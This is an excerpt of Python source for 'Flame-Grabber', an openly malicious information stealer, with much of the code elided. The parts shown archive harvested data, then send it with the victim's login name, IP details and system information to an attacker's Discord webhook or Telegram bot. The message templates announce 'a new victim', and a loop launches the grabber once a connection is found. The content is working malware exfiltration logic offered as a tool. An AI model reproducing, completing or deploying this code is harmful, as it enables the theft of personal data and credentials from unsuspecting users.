...
Logger = logging.getLogger("Flame-Grabber")
...
class FlameGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]:  # Create archive of the data collected
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or "flame"
    ...
    def SendData(self) -> None:  # Sends data to the webhook
        ...
        filename = "Flame-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0:  # Discord Webhook
                image_url = "https://cdn.discordapp.com/attachments/1164559111879393342/1164618348483584071/icon.jpg?ex=6543de5b&is=6531695b&hm=56aef749af4cbc6ab9b5e3729abc13951478b1064ab1d179c4100fd7b8d616b3&"

                payload = {
                    "content": "||@everyone||" if Settings.PingMe else "",
                    "embeds": [
                        {
                            "title": "Flame-Grabber Got A Target :smiling_imp:",
                            "description": f"**[System] Infos\n```autohotkey\n{system_info}```\n[IP] Info```prolog\n{ipinfo}```\n[Other] Info```js\n{grabbedInfo}```**",
                            "url": "https://bio.link/grabber",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by Flame-Grabber | CxOnTop"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1:  # Telegram Bot
                payload = {
                    'caption': f'<b>Flame-Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(),
                    'parse_mode': 'HTML'
                }
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet():  # Check if internet connection is available
                    ...
                    FlameGrabber()  # Start the grabber
